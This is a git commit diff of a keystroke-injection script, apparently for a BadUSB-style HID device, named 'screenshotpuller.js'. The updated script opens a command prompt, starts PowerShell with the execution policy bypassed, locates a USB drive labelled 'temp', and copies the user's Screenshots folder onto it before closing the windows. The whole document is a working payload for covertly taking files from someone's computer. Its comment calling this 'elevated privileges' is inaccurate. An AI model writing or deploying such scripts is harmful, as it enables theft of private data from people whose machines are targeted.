bc4b4db16a098ff05b4bd0603ed244e4316852ac
D1e_Trash <114583419+WaltuhWyl@users.noreply.github.com>
2025-07-17 18:25:04 +0200

    Update screenshotpuller.js

--- mine_HID_scripts_etc/screenshotpuller.js
+++ mine_HID_scripts_etc/screenshotpuller.js
@@ -1,13 +1,47 @@
 layout('us');
 press("GUI r");
-delay(500) ;
-type("cmd")
+delay(125);
+type("cmd");
 press("ENTER");
-delay(1000);
-type(("xcopy %userprofile%\\pictures\\screenshots G:\\pliki")) //change the drive letter to the one your usb is
+delay(200);
+
+// Start PowerShell with elevated privileges
+type("powershell -NoProfile -ExecutionPolicy Bypass");
 press("ENTER");
-type("D")
+delay(200);
+
+// Get the drive labeled 'temp'
+type("$drive = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq 'temp' }");
 press("ENTER");
-delay(10000);
-type("exit")
-press("ENTER")
+delay(125);
+
+// If drive exists, assign drive letter
+type("if ($drive) {");
+press("ENTER");
+delay(125);
+type("    $driveLetter = $drive.DriveLetter");
+press("ENTER");
+delay(125);
+
+// Copy screenshots to the temp drive
+type("    $sourcePath = \"$env:USERPROFILE\\Pictures\\Screenshots\"");
+press("ENTER");
+delay(125);
+type("    $destPath = \"$driveLetter\\pliki\"");
+press("ENTER");
+delay(125);
+type("    xcopy $sourcePath $destPath /E /I /Y");
+press("ENTER");
+delay(125);
+
+// Close if-block
+type("}");
+press("ENTER");
+delay(200);
+
+type("exit");
+press("ENTER");
+delay(125);
+
+type("exit");
+press("ENTER");
